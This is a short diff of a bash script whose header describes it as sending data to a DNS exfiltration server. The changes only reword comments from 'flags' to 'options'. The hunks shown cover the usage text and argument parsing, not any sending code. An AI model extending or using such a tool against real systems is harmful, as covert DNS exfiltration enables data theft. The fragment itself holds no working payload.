@@ -1,6 +1,6 @@
 #!/bin/bash
 # Send data to DNS exfiltration server.
-# Usage: command [-flags] domain
+# Usage: command [-options] domain
 # Options:
 #   -l: localhost
 #   -n: number of characters to store before sending a packet
@@ -15,7 +15,7 @@ fi
 local_server=""
 char_queue=5
 
-# check command line flags
+# check command line options
 while [ $# -gt 0 ]; do
   # check if server is on localhost
   if [ $1 = "-l" ]; then
@@ -23,7 +23,7 @@ while [ $# -gt 0 ]; do
   elif [ $1 = "-n" ]; then
     char_queue=$2
   else
-    # if it isn't a flag, break out of the loop
+    # if it isn't an option, break out of the loop
     break
   fi
   shift
